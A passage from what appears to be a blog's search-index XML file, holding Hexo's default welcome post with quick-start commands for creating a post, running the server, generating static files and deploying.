    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
